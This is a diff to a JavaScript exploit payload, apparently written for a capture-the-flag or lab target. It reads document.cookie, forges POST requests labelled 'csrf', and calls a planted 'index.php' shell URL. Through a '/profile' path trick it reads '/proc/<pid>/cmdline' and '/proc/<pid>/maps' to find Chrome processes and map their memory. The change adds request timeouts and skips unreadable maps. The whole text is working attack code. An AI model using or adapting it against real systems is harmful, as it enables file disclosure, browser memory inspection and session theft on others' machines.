@@ -2,7 +2,16 @@
 const REPO={platform:'github',name:'2ash1/static',repositoryUrl:'https://github.com/2Ash1/static',branch:'main'};
 const SHELL='http://admin-app/packages/2ash1/static/index.php';
 const post=t=>fetch('/edit',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'title=csrf&content='+encodeURIComponent(t.replace(/[^A-Za-z0-9 !.:()]/g,' '))});
-const r=async p=>{try{let x=await fetch('/profile'+p+'%3f',{cache:'no-store'});return [x.status,await x.text()]}catch(e){return [0,'']}};
+const r=async p=>{
+ try{
+  let ac=new AbortController();
+  let tm=setTimeout(()=>ac.abort(),1200);
+  let x=await fetch('/profile'+p+'%3f',{cache:'no-store',signal:ac.signal});
+  let t=await x.text();
+  clearTimeout(tm);
+  return [x.status,t];
+ }catch(e){return [0,'']}
+};
 const rt=async p=>(await r(p))[1];
 const cmd=()=>{
  let ck=document.cookie.split(';')[0];
@@ -25,10 +34,11 @@ const install=csrf=>{
 post('stage start');
 for(let pid=1;pid<900;pid++){
  let c=await rt('/proc/'+pid+'/cmdline');
- if(!/chrome|chromium/i.test(c))continue;
+  if(!/chrome|chromium/i.test(c))continue;
  post('pid '+pid);
  let mr=await r('/proc/'+pid+'/maps');
  post('maps '+mr[0]+' '+mr[1].length);
+ if(mr[0]!=200||mr[1].length<10)continue;
  let m=mr[1];
  let regs=[];
  for(let line of m.split('\n')){
